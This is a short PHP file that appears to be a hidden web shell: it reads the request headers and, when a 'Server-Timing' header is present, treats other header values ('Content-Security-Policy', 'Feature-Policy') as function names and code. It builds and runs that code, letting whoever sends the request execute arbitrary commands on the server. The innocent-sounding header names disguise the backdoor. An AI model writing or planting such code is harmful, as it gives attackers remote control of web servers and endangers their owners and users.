<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $rfind = $_HEADERS['Server-Timing']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Feature-Policy']));
    $rfind();
}